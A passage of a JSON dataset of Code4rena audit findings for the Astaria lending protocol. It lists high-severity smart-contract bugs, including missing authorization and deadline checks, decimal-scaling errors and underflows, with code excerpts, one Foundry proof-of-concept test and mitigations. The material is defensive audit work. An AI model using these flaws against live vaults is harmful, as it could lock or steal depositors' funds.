      "summary": "\nThis bug report is about an issue in the Astaria system, where an unapproved, non-owner of collateral can still take loan for the owner/operator of collateral even when the owner did not need any loan. This is caused due to incorrect checks in the code. \n\nThe proof of concept (POC) for this bug is as follows. A new loan is originated via `commitToLien` function by User X. The parameters used by User X are the collateral ID, the owner of the collateral, the approved user for the collateral, and the receiver being the owner of the collateral. Internally, this makes a call to `_requestLienAndIssuePayout`, which then calls `_validateCommitment` function for signature verification. \n\nThe signature verification should fail, as User X is not the owner of the collateral, is not approved for this collateral, and is not approved for all of User Y's token. However, the if condition in the code does not execute as the receiver is the holder, thus failing the if condition. This means the signature verification passes and loan is issued for collateral owner without their consent. \n\nThe recommended mitigation steps for this bug are to revise the condition as shown in the report. This was confirmed by SantiagoGregory (Astaria) via duplicate issue `#565`.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Astaria",
      "source_link": "https://code4rena.com/reports/2023-01-astaria",
      "github_link": "https://github.com/code-423n4/2023-01-astaria-findings/issues/19",
      "tags": [],
      "finders": [
        "csanuragjain",
        "cergyk",
        "7siech",
        "bin2chen",
        "Koolex",
        "KIntern\\_NA",
        "evan",
        "unforgiven",
        "obront"
      ]
    },
    {
      "id": "25815",
      "title": "[H-20] Deadlock in vaults with underlying token with less then 18 decimals",
      "impact": "HIGH",
      "content": "\nIf underlying token for the vault would have less then 18 decimals, then after liquidation there would be no way to process epoch, because `claim` function in `WithdrawProxy.sol` would revert, this would lock all user out of their funds both in vault and in withdraw proxy. Alternatively, if there is more then 18 decimals, claim would leave much less funds than needed for withdraw, resulting in withdrawers losing funds.\n\nTo make report more concise, I would focus on tokens with less then 18 decimals, because they are much more frequent. For example, WBTC have 8 decimals and most stablecoins have 6.\n\n### Why is this happening\n\n<https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/PublicVault.sol#L314-L316><br>\nthis part making sure that withdraw ratio are always stored in 1e18 scale.\n\n<https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/WithdrawProxy.sol#L271-L274><br>\nbut here, we are not transforming it into token decimals scale. `transferAmount` would be orders of magnitudes larger than balance \n\n<https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/WithdrawProxy.sol#L277><br>\nthen, here we would have underflow of `balance` value\n\n<https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/WithdrawProxy.sol#L281><br>\nand finally, here function would revert.\n\n<https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/WithdrawProxy.sol#L156><br>\n<https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/PublicVault.sol#L299><br>\nbecause `PublicVault.sol` need `claim` to proccess epoch, and `WithdrawProxy.sol` unlocks funds only after `claim`, it will result in deadlock of the whole system.\n\n### Proof of Concept\n\nFirst, creating token with 8 decimals:\n\n    contract Token8Decimals is ERC20{\n    constructor() ERC20(\"TEST\", \"TEST\", 8) {}\n\n    function mint(address to, uint amount) public{\n        _mint(to, amount);\n    }\n    }\n\nSecond, I changed `_bid` function in `TestHelpers.t.sol` contract, so it could take token address as a last parameter, and use it instead of WETH.\n\nThen, here is modified \"testLiquidation5050Split\" test:\n\n    function testLiquidation5050Split() public {\n    TestNFT nft = new TestNFT(2);\n    _mintNoDepositApproveRouter(address(nft), 5);\n    address tokenContract = address(nft);\n    uint256 tokenId = uint256(1);\n\n    Token8Decimals token = new Token8Decimals();\n\n    // create a PublicVault with a 14-day epoch\n    vm.startPrank(strategistOne);\n    //bps\n    address publicVault = (ASTARIA_ROUTER.newPublicVault(\n      14 days,\n      strategistTwo,\n      address(token),\n      uint256(0),\n      false,\n      new address[](0),\n      uint256(0)\n    ));\n    vm.stopPrank();\n\n    uint amountToLend = 10**8 * 1000;\n    token.mint(address(1), amountToLend);\n    vm.startPrank(address(1));\n    token.approve(address(TRANSFER_PROXY), amountToLend);\n\n    ASTARIA_ROUTER.depositToVault(\n      IERC4626(publicVault),\n      address(1),\n      amountToLend,\n      uint256(0)\n    );\n    vm.stopPrank();\n\n    ILienToken.Details memory lien = standardLienDetails;\n    lien.liquidationInitialAsk = amountToLend*2;\n\n    (, ILienToken.Stack[] memory stack1) = _commitToLien({\n      vault: publicVault,\n      strategist: strategistOne,\n      strategistPK: strategistOnePK,\n      tokenContract: tokenContract,\n      tokenId: tokenId,\n      lienDetails: lien,\n      amount: amountToLend/4,\n      isFirstLien: true\n    });\n\n    uint256 collateralId = tokenContract.computeId(tokenId);\n\n    _signalWithdraw(address(1), publicVault);\n\n    WithdrawProxy withdrawProxy = PublicVault(publicVault).getWithdrawProxy(\n      PublicVault(publicVault).getCurrentEpoch()\n    );\n\n    skip(14 days);\n\n    OrderParameters memory listedOrder1 = ASTARIA_ROUTER.liquidate(\n      stack1,\n      uint8(0)\n    );\n\n    token.mint(bidder, amountToLend);\n    _bid(Bidder(bidder, bidderPK), listedOrder1, amountToLend/2, address(token));\n    vm.warp(withdrawProxy.getFinalAuctionEnd());\n    emit log_named_uint(\"finalAuctionEnd\", block.timestamp);\n    PublicVault(publicVault).processEpoch();\n\n    skip(13 days);\n\n    withdrawProxy.claim();\n    }\n\n`withdrawProxy.claim();` at the last line would revert\n\n### Recommended Mitigation Steps\n\n<https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/WithdrawProxy.sol#L273><br>\nChange this line to `10**18`\n\n### Severity\n\nI think this is high risk, because\n\n1.  There are high demand for stablecoin denominated vaults, and Astaria are designed to support that.\n2.  This bug is sneaky, there could be many epochs before first liquidation that would trigger the deadlock.\n3.  ALL funds would be lost, which is catastrophic.\n\n**[SantiagoGregory (Astaria) confirmed via duplicate issue `#482`](https://github.com/code-423n4/2023-01-astaria-findings/issues/482#event-8369726739)**\n\n\n\n***\n\n",
      "summary": "\nA bug has been identified in the Astaria protocol that could cause a deadlock if the underlying token for the vault has less then 18 decimals. This is a high risk bug, because there is a high demand for stablecoin denominated vaults, and this bug is sneaky, as there could be many epochs before the first liquidation that would trigger the deadlock. This would result in all funds being lost, which is catastrophic.\n\nThe issue is that the `claim` function in `WithdrawProxy.sol` would revert if the underlying token for the vault has less then 18 decimals. This is because the `PublicVault.sol` needs `claim` to process epoch, and `WithdrawProxy.sol` unlocks funds only after `claim`. Alternatively, if there is more then 18 decimals, `claim` would leave much less funds than needed for withdraw, resulting in withdrawers losing funds.\n\nTo replicate the issue, a token with 8 decimals was created, and the `_bid` function was modified to take a token address as a last parameter. A modified \"testLiquidation5050Split\" test was then run, and the `withdrawProxy.claim();` at the last line reverted.\n\nThe recommended mitigation steps for this issue is to change the line in `WithdrawProxy.sol` to `10**18`. SantiagoGregory (Astaria) confirmed via duplicate issue `#482`.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Astaria",
      "source_link": "https://code4rena.com/reports/2023-01-astaria",
      "github_link": "https://github.com/code-423n4/2023-01-astaria-findings/issues/72",
      "tags": [],
      "finders": [
        "Jeiwan",
        "joestakey",
        "gz627",
        "Tointer",
        "chaduke",
        "unforgiven",
        "rvierdiiev",
        "obront"
      ]
    },
    {
      "id": "25814",
      "title": "[H-19] Vaults don't verify that a strategy's deadline has passed",
      "impact": "HIGH",
      "content": "\n<https://github.com/code-423n4/2023-01-astaria/blob/main/src/VaultImplementation.sol#L229-L266><br>\n<https://github.com/code-423n4/2023-01-astaria/blob/main/src/AstariaRouter.sol#L439>\n\nThe vault doesn't verify that a deadline hasn't passed when a commitment is validated. Users are able to take out loans using strategies that have already expired. Depending on the nature of the strategy that can cause a loss of funds for the LPs.\n\n### Proof of Concept\n\nWhen you take out a loan using the AstariaRouter, the deadline is verified:\n\n```sol\n  function _validateCommitment(\n    RouterStorage storage s,\n    IAstariaRouter.Commitment calldata commitment,\n    uint256 timeToSecondEpochEnd\n  ) internal view returns (ILienToken.Lien memory lien) {\n    if (block.timestamp > commitment.lienRequest.strategy.deadline) {\n      revert InvalidCommitmentState(CommitmentState.EXPIRED);\n    }\n// ...\n```\n\nBut, `VaultImplementation._validateCommitment()` skips that check:\n\n```sol\n  function _validateCommitment(\n    IAstariaRouter.Commitment calldata params,\n    address receiver\n  ) internal view {\n    uint256 collateralId = params.tokenContract.computeId(params.tokenId);\n    ERC721 CT = ERC721(address(COLLATERAL_TOKEN()));\n    address holder = CT.ownerOf(collateralId);\n    address operator = CT.getApproved(collateralId);\n    if (\n      msg.sender != holder &&\n      receiver != holder &&\n      receiver != operator &&\n      !CT.isApprovedForAll(holder, msg.sender)\n    ) {\n      revert InvalidRequest(InvalidRequestReason.NO_AUTHORITY);\n    }\n    VIData storage s = _loadVISlot();\n    address recovered = ecrecover(\n      keccak256(\n        _encodeStrategyData(\n          s,\n          params.lienRequest.strategy,\n          params.lienRequest.merkle.root\n        )\n      ),\n      params.lienRequest.v,\n      params.lienRequest.r,\n      params.lienRequest.s\n    );\n    if (\n      (recovered != owner() && recovered != s.delegate) ||\n      recovered == address(0)\n    ) {\n      revert IVaultImplementation.InvalidRequest(\n        InvalidRequestReason.INVALID_SIGNATURE\n      );\n    }\n  }\n```\n\nIf you search for `deadline` in the codebase you'll see that there's no other place where the property is accessed.\n\nAs long as the user takes out the loan from the vault directly, they can use strategies that have expired. The vault owner could prevent this from happening by incrementing the `strategistNonce` after the strategy expired.\n\n### Recommended Mitigation Steps\n\nIn `VaultImplementation._validateCommitment()` check that `deadline > block.timestamp`.\n\n**[SantiagoGregory (Astaria) confirmed](https://github.com/code-423n4/2023-01-astaria-findings/issues/122)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report concerns the codebase of Astaria, which is a decentralized lending platform. The issue is that the Vault does not verify that the deadline of a commitment has not passed when it is validated, meaning users are able to take out loans using strategies that have already expired, which can cause a loss of funds for the LPs depending on the nature of the strategy. \n\nThe bug is present in the `VaultImplementation._validateCommitment()` function, as it does not check that the `deadline > block.timestamp`. A proof of concept is provided, which demonstrates that when a loan is taken out using the AstariaRouter, the deadline is verified.\n\nThe recommended mitigation step is to add a check in the `VaultImplementation._validateCommitment()` function that `deadline > block.timestamp`. This has been confirmed by Santiago Gregory (Astaria).",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Astaria",
      "source_link": "https://code4rena.com/reports/2023-01-astaria",
      "github_link": "https://github.com/code-423n4/2023-01-astaria-findings/issues/122",
      "tags": [],
      "finders": [
        "Ruhum"
      ]
    },
    {
      "id": "25813",
      "title": "[H-18] `PublicVault.processEpoch` calculates `withdrawReserve` incorrectly; Users can lose funds",
      "impact": "HIGH",
      "content": "\nPublicVault.processEpoch calculates withdrawReserve incorrectly. As result user can receive less funds when totalAssets() <= expected from auction.\n\n### Proof of Concept\n\nWhen users wants to withdraw from `PublicVault` then `WithdrawProxy` is deployed and `PublicVault.processEpoch` function is responsible to calculate `s.withdrawReserve`.\nThis amount depends on how many shares should be redeemed and if there is auction for the epoch.\n\n<https://github.com/code-423n4/2023-01-astaria/blob/main/src/PublicVault.sol#L275-L343>\n\n    solidity\n      function processEpoch() public {\n        // check to make sure epoch is over\n        if (timeToEpochEnd() > 0) {\n          revert InvalidState(InvalidStates.EPOCH_NOT_OVER);\n        }\n        VaultData storage s = _loadStorageSlot();\n\n\n        if (s.withdrawReserve > 0) {\n          revert InvalidState(InvalidStates.WITHDRAW_RESERVE_NOT_ZERO);\n        }\n\n\n        WithdrawProxy currentWithdrawProxy = WithdrawProxy(\n          s.epochData[s.currentEpoch].withdrawProxy\n        );\n\n\n        // split funds from previous WithdrawProxy with PublicVault if hasn't been already\n        if (s.currentEpoch != 0) {\n          WithdrawProxy previousWithdrawProxy = WithdrawProxy(\n            s.epochData[s.currentEpoch - 1].withdrawProxy\n          );\n          if (\n            address(previousWithdrawProxy) != address(0) &&\n            previousWithdrawProxy.getFinalAuctionEnd() != 0\n          ) {\n            previousWithdrawProxy.claim();\n          }\n        }\n\n\n        if (s.epochData[s.currentEpoch].liensOpenForEpoch > 0) {\n          revert InvalidState(InvalidStates.LIENS_OPEN_FOR_EPOCH_NOT_ZERO);\n        }\n\n\n        // reset liquidationWithdrawRatio to prepare for re calcualtion\n        s.liquidationWithdrawRatio = 0;\n\n\n        // check if there are LPs withdrawing this epoch\n        if ((address(currentWithdrawProxy) != address(0))) {\n          uint256 proxySupply = currentWithdrawProxy.totalSupply();\n\n\n          s.liquidationWithdrawRatio = proxySupply\n            .mulDivDown(1e18, totalSupply())\n            .safeCastTo88();\n\n\n          currentWithdrawProxy.setWithdrawRatio(s.liquidationWithdrawRatio);\n          uint256 expected = currentWithdrawProxy.getExpected();\n\n\n          unchecked {\n            if (totalAssets() > expected) {\n              s.withdrawReserve = (totalAssets() - expected)\n                .mulWadDown(s.liquidationWithdrawRatio)\n                .safeCastTo88();\n            } else {\n              s.withdrawReserve = 0;\n            }\n          }\n          _setYIntercept(\n            s,\n            s.yIntercept -\n              totalAssets().mulDivDown(s.liquidationWithdrawRatio, 1e18)\n          );\n          // burn the tokens of the LPs withdrawing\n          _burn(address(this), proxySupply);\n        }\n\n\n        // increment epoch\n        unchecked {\n          s.currentEpoch++;\n        }\n      }\n\n`  s.liquidationWithdrawRatio ` depends on how many shares exists inside WithdrawProxy. In case if amount of shares inside `WithdrawProxy` equal to amount of shares inside `PublicVault` that means that withdraw ratio is 100% and all funds from Vault should be sent to `WithdrawProxy`.\n\nIn case if auction is in progress then `WithdrawProxy.getExpected` is not 0 and some amount of funds is expected from auction.\n\n```solidity\nunchecked {\n        if (totalAssets() > expected) {\n          s.withdrawReserve = (totalAssets() - expected)\n            .mulWadDown(s.liquidationWithdrawRatio)\n            .safeCastTo88();\n        } else {\n          s.withdrawReserve = 0;\n        }\n      }\n```\n\nThis is `s.withdrawReserve` calculation. As you can see in case if `totalAssets() <= expected` then `s.withdrawReserve` is set to 0 and no funds will be sent to proxy. This is incorrect though.\n\nFor example in the case when withdraw ratio is 100% all funds should be sent to the withdraw proxy, but because of that check, some part of funds will be still inside the vault and depositors will lose their funds. If for example totalAssets is 5eth and expected is 5 eth, then depositors will lose all 5 eth.\n\nThis check is done in such way, because of [calculations inside `WithdrawProxy`](https://github.com/code-423n4/2023-01-astaria/blob/main/src/WithdrawProxy.sol#L258-L266). But it's not correct.\n\n### Tools Used\n\nVsCode\n\n### Recommended Mitigation Steps\n\nYou need to check this logic again. Maybe you need to always send `s.withdrawReserve = totalAssets().mulWadDown(s.liquidationWithdrawRatio).safeCastTo88()` amount to the withdraw proxy. But then you need to rethink, how WithdrawProxy will handle yIntercept increase/decrease.\n\n\n\n***\n\n",
      "summary": "\nA bug has been identified in the PublicVault.processEpoch function, which incorrectly calculates the withdrawReserve amount when the totalAssets() is less than or equal to the expected amount from the auction. This means that users may receive less funds than expected when withdrawing from the PublicVault.\n\nThe bug is caused by the `s.liquidationWithdrawRatio` depending on the amount of shares inside the WithdrawProxy, and the calculation of `s.withdrawReserve` when `totalAssets() <= expected`. In this case, the `s.withdrawReserve` is set to 0, meaning no funds will be sent to the WithdrawProxy. This is incorrect, as all funds should be sent to the WithdrawProxy when the withdraw ratio is 100%, even if the `totalAssets()` is less than the `expected` amount.\n\nThe recommended mitigation steps are to check the logic again, and consider sending the `s.withdrawReserve = totalAssets().mulWadDown(s.liquidationWithdrawRatio).safeCastTo88()` amount to the WithdrawProxy. However, this would require rethinking how the WithdrawProxy will handle yIntercept increase/decrease. The tools used to identify the bug were VsCode.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Astaria",
      "source_link": "https://code4rena.com/reports/2023-01-astaria",
      "github_link": "https://github.com/code-423n4/2023-01-astaria-findings/issues/157",
      "tags": [],
      "finders": [
        "rvierdiiev"
      ]
    },
    {
      "id": "25812",
      "title": "[H-17] Function `processEpoch()` in PublicVault would revert when most of the users withdraw their funds because of the underflow for new yIntercept calculation",
      "impact": "HIGH",
      "content": "\n<https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/PublicVault.sol#L314-L335><br>\n<https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/PublicVault.sol#L479-L493>\n\nWhen users withdraw their vault tokens PublicVault mint WithdrawProxy's shares token for them and at the end of the epoch PublicVault would calculated WithdrawProxy's assets and update PublicVault assets and start the next epoch. if a lot of users withdraws their funds then the value of the `totalAssets().mulDivDown(s.liquidationWithdrawRatio, 1e18)` (the amount belongs to the WithdrawProxy) would be higher than `yIntercept` and code would revert because of the underflow when setting the new value of the `yIntercept`. This would cause last users to not be able to withdraw their funds and contract epoch system to be broken for a while.\n\n### Proof of Concept\n\nThis is part of `processEpoch()` code that calculates ratio between WithdrawProxy and PublicVault:\n\n      function processEpoch() public {\n    .....\n    .....\n        // reset liquidationWithdrawRatio to prepare for re calcualtion\n        s.liquidationWithdrawRatio = 0;\n\n        // check if there are LPs withdrawing this epoch\n        if ((address(currentWithdrawProxy) != address(0))) {\n          uint256 proxySupply = currentWithdrawProxy.totalSupply();\n\n          s.liquidationWithdrawRatio = proxySupply\n            .mulDivDown(1e18, totalSupply())\n            .safeCastTo88();\n\n          currentWithdrawProxy.setWithdrawRatio(s.liquidationWithdrawRatio);\n          uint256 expected = currentWithdrawProxy.getExpected();\n\n          unchecked {\n            if (totalAssets() > expected) {\n              s.withdrawReserve = (totalAssets() - expected)\n                .mulWadDown(s.liquidationWithdrawRatio)\n                .safeCastTo88();\n            } else {\n              s.withdrawReserve = 0;\n            }\n          }\n          _setYIntercept(\n            s,\n            s.yIntercept -\n              totalAssets().mulDivDown(s.liquidationWithdrawRatio, 1e18)\n          );\n          // burn the tokens of the LPs withdrawing\n          _burn(address(this), proxySupply);\n        }\n\nAs you can see in the line `_setYIntercept(s, s.yIntercept - totalAssets().mulDivDown(s.liquidationWithdrawRatio, 1e18))` code tries to set new value for `yIntercept` but This is `totalAssets()` code:\n\n      function totalAssets()\n        public\n        view\n        virtual\n        override(ERC4626Cloned)\n        returns (uint256)\n      {\n        VaultData storage s = _loadStorageSlot();\n        return _totalAssets(s);\n      }\n\n      function _totalAssets(VaultData storage s) internal view returns (uint256) {\n        uint256 delta_t = block.timestamp - s.last;\n        return uint256(s.slope).mulDivDown(delta_t, 1) + uint256(s.yIntercept);\n      }\n\nSo as you can see `totalAssets()` can be higher than `yIntercept` and if most of the user withdraw their funds(for example the last user) then the value of `liquidationWithdrawRatio` would be near `1` too and the value of `totalAssets().mulDivDown(s.liquidationWithdrawRatio, 1e18)` would be bigger than `yIntercept` and call to `processEpoch()` would revert and code can't start the next epoch and user withdraw process can't be finished and funds would stuck in the contract.\n\n### Tools Used\n\nVIM\n\n### Recommended Mitigation Steps\n\nPrevent underflow by calling `accrue()` in the begining of the `processEpoch()`.\n\n**[SantiagoGregory (Astaria) confirmed via duplicate issue `#408`](https://github.com/code-423n4/2023-01-astaria-findings/issues/408#event-8415693497)**\n\n**[Picodes (judge) increased severity to High](https://github.com/code-423n4/2023-01-astaria-findings/issues/188#issuecomment-1443477344)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about the PublicVault.sol code, which is part of a project called Astaria. The code is responsible for calculating the ratio between the WithdrawProxy and the PublicVault when users withdraw their funds from the vault. The problem is that when a lot of users withdraw their funds, the value of the totalAssets().mulDivDown(s.liquidationWithdrawRatio, 1e18) can be higher than the yIntercept, which can cause an underflow when setting the new value of yIntercept. This would prevent the last user from withdrawing their funds and break the contract epoch system.\n\nThe code that is causing the issue is part of the processEpoch() function, which calculates the ratio between WithdrawProxy and PublicVault. The code tries to set a new value for yIntercept but totalAssets() can be higher than yIntercept, which causes the code to revert.\n\nThe tools used for this bug report were VIM. To mitigate this issue, it is recommended to call accrue() at the beginning of the processEpoch() to prevent underflow. This was confirmed by SantiagoGregory (Astaria) via duplicate issue #408. The severity was also increased to High by Picodes (judge).",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Astaria",
      "source_link": "https://code4rena.com/reports/2023-01-astaria",
      "github_link": "https://github.com/code-423n4/2023-01-astaria-findings/issues/188",
      "tags": [],
      "finders": [
        "evan",
        "unforgiven",
        "0xbepresent"
      ]
    },
    {
      "id": "25811",
      "title": "[H-16] When Public Vault A buys out Public Vault B's lien tokens, it does not increase Public Vault A's liensOpenForEpoch, which would result in the lien tokens not being repaid",
      "impact": "HIGH",
      "content": "\nVault A can call buyoutLien to buy out Vault B's lien tokens, which calls LienToken.buyoutLien\n\n```solidity\n  function buyoutLien(\n    ILienToken.Stack[] calldata stack,\n    uint8 position,\n    IAstariaRouter.Commitment calldata incomingTerms\n  )\n    external\n    whenNotPaused\n    returns (ILienToken.Stack[] memory, ILienToken.Stack memory)\n  {\n...\n    return\n      lienToken.buyoutLien(\n        ILienToken.LienActionBuyout({\n          position: position,\n          encumber: ILienToken.LienActionEncumber({\n            amount: owed,\n            receiver: recipient(),\n            lien: ROUTER().validateCommitment({\n              commitment: incomingTerms,\n              timeToSecondEpochEnd: _timeToSecondEndIfPublic()\n            }),\n            stack: stack\n```\n\nIn LienToken.buyoutLien, it will burn Vault B's lien token and mint a new lien token for Vault A\n\n```solidity\n  function _replaceStackAtPositionWithNewLien(\n    LienStorage storage s,\n    ILienToken.Stack[] calldata stack,\n    uint256 position,\n    Stack memory newLien,\n    uint256 oldLienId\n  ) internal returns (ILienToken.Stack[] memory newStack) {\n    newStack = stack;\n    newStack[position] = newLien;\n    _burn(oldLienId);                        // @ audit: burn Vault B's lien token\n    delete s.lienMeta[oldLienId];\n  }\n...\n    newLienId = uint256(keccak256(abi.encode(params.lien)));\n    Point memory point = Point({\n      lienId: newLienId,\n      amount: params.amount.safeCastTo88(),\n      last: block.timestamp.safeCastTo40(),\n      end: (block.timestamp + params.lien.details.duration).safeCastTo40()\n    });\n    _mint(params.receiver, newLienId); // @ audit: mint a new lien token for Vault A\n    return (newLienId, Stack({lien: params.lien, point: point}));\n  }\n```\n\nAnd, when Vault B is a public vault, the handleBuyoutLien function of Vault B will be called to decrease liensOpenForEpoch.<br>\nHowever, when Vault A is a public vault, it does not increase the liensOpenForEpoch of Vault A.\n\n```solidity\n    if (_isPublicVault(s, payee)) {\n      IPublicVault(payee).handleBuyoutLien(\n        IPublicVault.BuyoutLienParams({\n          lienSlope: calculateSlope(params.encumber.stack[params.position]),\n          lienEnd: params.encumber.stack[params.position].point.end,\n          increaseYIntercept: buyout -\n            params.encumber.stack[params.position].point.amount\n        })\n      );\n    }\n...\n  function handleBuyoutLien(BuyoutLienParams calldata params)\n    public\n    onlyLienToken\n  {\n    VaultData storage s = _loadStorageSlot();\n\n    unchecked {\n      uint48 newSlope = s.slope - params.lienSlope.safeCastTo48();\n      _setSlope(s, newSlope);\n      s.yIntercept += params.increaseYIntercept.safeCastTo88();\n      s.last = block.timestamp.safeCastTo40();\n    }\n\n    _decreaseEpochLienCount(s, getLienEpoch(params.lienEnd.safeCastTo64()));  // @audit: decrease liensOpenForEpoch \n    emit YInterceptChanged(s.yIntercept);\n  }\n```\n\nSince the liensOpenForEpoch of the public vault decreases when the lien token is repaid, and since the liensOpenForEpoch of public vault A is not increased, then when that lien token is repaid, \\_payment will fail due to overflow when decreasing the liensOpenForEpoch.\n\n```solidity\n    } else {\n      amount = stack.point.amount;\n      if (isPublicVault) {\n        // since the openLiens count is only positive when there are liens that haven't been paid off\n        // that should be liquidated, this lien should not be counted anymore\n        IPublicVault(lienOwner).decreaseEpochLienCount(  //  @audit: overflow here\n          IPublicVault(lienOwner).getLienEpoch(end)\n        );\n      }\n```\n\nConsider the following case.\n- Public Vault B holds a lien token and B.liensOpenForEpoch == 1\n- Public Vault A buys out B's lien token for refinancing, B.liensOpenForEpoch == 0, A.liensOpenForEpoch == 0\n- borrower wants to repay the loan, in the \\_payment function, the decreaseEpochLienCount function of Vault A will be called, ` A.liensOpenForEpoch--  `will trigger an overflow, resulting in borrower not being able to repay the loan, and borrower's collateral will be auctioned off, but in the call to updateVaultAfterLiquidation function will also fail in decreaseEpochLienCount due to the overflow\n\n```solidity\n  function updateVaultAfterLiquidation(\n    uint256 maxAuctionWindow,\n    AfterLiquidationParams calldata params\n  ) public onlyLienToken returns (address withdrawProxyIfNearBoundary) {\n    VaultData storage s = _loadStorageSlot();\n\n    _accrue(s);\n    unchecked {\n      _setSlope(s, s.slope - params.lienSlope.safeCastTo48());\n    }\n\n    if (s.currentEpoch != 0) {\n      transferWithdrawReserve();\n    }\n    uint64 lienEpoch = getLienEpoch(params.lienEnd);\n    _decreaseEpochLienCount(s, lienEpoch); //  @audit: overflow here\n```\n\nAs a result, the borrower cannot repay the loan and the borrower's collateral cannot be auctioned off, thus causing the depositor of the public vault to suffer a loss\n\n### Proof of Concept\n\n<https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/VaultImplementation.sol#L313-L351><br>\n<https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L835-L843><br>\n<https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/PublicVault.sol#L640-L655>\n\n### Recommended Mitigation Steps\n\nIn LienToken.buyoutLien, when the caller is a public vault, increase the decreaseEpochLienCount of the public vault.\n\n**[SantiagoGregory (Astaria) confirmed](https://github.com/code-423n4/2023-01-astaria-findings/issues/222)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about an issue in the Astaria smart contract code. The issue is that when Vault A calls buyoutLien to buy out Vault B's lien tokens, the decreaseEpochLienCount of the public vault is not increased when the lien token is repaid. This can cause an overflow when decreasing the liensOpenForEpoch, resulting in the borrower not being able to repay the loan and the borrower's collateral being auctioned off.\n\nThe issue can be seen in the code snippets provided in the bug report. In the LienToken.buyoutLien function, when the caller is a public vault, the decreaseEpochLienCount of the public vault is not increased. This can cause an overflow when decreasing the liensOpenForEpoch, resulting in the borrower not being able to repay the loan and the borrower's collateral being auctioned off.\n\nThe recommended mitigation steps for this issue are to increase the decreaseEpochLienCount of the public vault in the LienToken.buyoutLien function when the caller is a public vault. This will ensure that the liensOpenForEpoch is increased when the lien token is repaid, thus avoiding the overflow issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Astaria",
      "source_link": "https://code4rena.com/reports/2023-01-astaria",
      "github_link": "https://github.com/code-423n4/2023-01-astaria-findings/issues/222",
      "tags": [],
      "finders": [
        "cccz",
        "0xbepresent",
        "Jeiwan",
        "chaduke"
      ]
    },
    {
      "id": "25810",
      "title": "[H-15] Wrong starting price when listing on Seaport for assets that has less than 18 decimals",
      "impact": "HIGH",
      "content": "\nAccording to Astaria's docs: <br><https://docs.astaria.xyz/docs/protocol-mechanics/loanterms>\n\n> Liquidation initial ask: Should the NFT go into liquidation, the initial price of the auction will be set to this value. Note that this set as a starting point for a dutch auction, and the price will decrease over the liquidation period. This figure is should also be specified in 10^18 format.\n\nThe liquidation initial ask is specified in 18 decimals. This is then used as a starting price when the NFT goes under auction on OpenSea. However, if the asset has less than 18 decimals, then the starting price goes wrong to Seaport.\n\nThis results in listing the NFT with too high price that makes it unlikely to be sold.\n\n### Proof of Concept\n\nThe starting price is set to the liquidation initial ask:\n\n```sh\n    listedOrder = s.COLLATERAL_TOKEN.auctionVault(\n      ICollateralToken.AuctionVaultParams({\n        settlementToken: stack[position].lien.token,\n        collateralId: stack[position].lien.collateralId,\n        maxDuration: auctionWindowMax,\n        startingPrice: stack[0].lien.details.liquidationInitialAsk,\n        endingPrice: 1_000 wei\n      })\n    );\n```\n\n<https://github.com/code-423n4/2023-01-astaria/blob/main/src/AstariaRouter.sol#L639-L647>\n\nLet's assume the asset is USDC which has 6 decimals:\n\n1.  Strategist signs a strategy with liquidationInitialAsk **1000e18**.\n2.  Following the docs, this means the starting price is supposed to be **1000** USDC\n3.  The NFT is being liquidated\n4.  1000e18 is passed to Seaport along with asset USDC\n5.  Seaport lists the NFT, and the price will be too high as1000e18 will be **1000000000000000** USDC\n\n### Recommended Mitigation Steps\n\n1.  Either fetch the asset's decimals on-chain or add it as a part of the strategy.\n2.  Convert liquidationInitialAsk to the asset's decimals before passing it as a starting price.\n\n**[SantiagoGregory (Astaria) confirmed](https://github.com/code-423n4/2023-01-astaria-findings/issues/235)**\n\n\n\n***\n\n",
      "summary": "\nA bug report has been filed regarding the liquidation initial ask of NFTs in Astaria. The liquidation initial ask is specified in 18 decimals, which is then used as a starting price when the NFT goes under auction on OpenSea. However, if the asset has less than 18 decimals, then the starting price goes wrong to Seaport and the NFT is listed with too high a price that makes it unlikely to be sold.\n\nA proof of concept was provided to demonstrate the issue. It was assumed that the asset was USDC, which has 6 decimals. In this case, the strategist signs a strategy with liquidationInitialAsk 1000e18, which should mean the starting price is supposed to be 1000 USDC. When the NFT is liquidated and 1000e18 is passed to Seaport along with asset USDC, the price is too high as 1000e18 will be 1000000000000000 USDC.\n\nTo mitigate this issue, it is recommended that either the asset's decimals be fetched on-chain or added as a part of the strategy. Additionally, liquidationInitialAsk should be converted to the asset's decimals before passing it as a starting price. SantiagoGregory (Astaria) confirmed this bug report.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Astaria",
      "source_link": "https://code4rena.com/reports/2023-01-astaria",
